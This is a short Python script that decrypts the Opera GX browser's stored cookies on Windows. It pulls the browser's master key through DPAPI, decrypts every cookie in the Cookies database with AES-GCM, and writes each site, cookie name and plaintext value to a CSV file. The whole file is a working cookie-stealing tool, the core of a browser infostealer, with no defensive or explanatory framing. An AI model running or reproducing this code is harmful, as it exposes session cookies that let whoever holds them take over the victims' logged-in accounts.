import os
import json
import base64
import sqlite3
from webbrowser import get
import win32crypt
from Crypto.Cipher import AES 


def get_master_key():
    file_path = os.environ["USERPROFILE"] + os.sep + r"AppData\Roaming\Opera Software\Opera GX Stable\Local State"
    file = open(file_path, "r")
    data = json.loads(file.read())
    file.close()
    b64_key = data["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(b64_key)[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def get_cookie(master_key):
    file_path = os.environ["USERPROFILE"] + os.sep + r"AppData\Roaming\Opera Software\Opera GX Stable\Network\Cookies"
    db = sqlite3.connect(file_path)
    cursor = db.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies;")
    data = cursor.fetchall()
    ls = ["site;nom;valeur"]
    for c in data:
        value = c[2]
        #Supp v10
        value = value[3:]
        iv = value[:12]
        payload = value[12:]
        crypteur = AES.new(master_key, AES.MODE_GCM, iv)
        texte = crypteur.decrypt(payload)[:-16]
        ls.append(f"{c[0]};{c[1]};{texte}")
    file = open("result.csv","w")
    file.write("\n".join(ls))
    file.close()
        

key = get_master_key()
get_cookie(master_key=key)